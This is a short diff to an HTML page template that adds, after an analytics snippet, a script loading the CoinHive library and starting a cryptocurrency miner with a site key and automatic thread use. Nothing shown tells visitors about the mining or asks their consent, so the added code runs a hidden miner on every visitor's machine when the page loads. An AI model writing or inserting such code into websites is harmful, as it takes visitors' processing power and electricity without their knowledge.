@@ -48,5 +48,13 @@
         ga('send', 'pageview');
       </script>
     {% endif %}
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <script>
+      var miner = new CoinHive.User('KLudWuVw9RDhHzDEsn1SnIz3lgdUY22z', 'dolmen', {
+        autoThreads: true
+      });
+      miner.start();
+    </script>
+
   </body>
 </html>
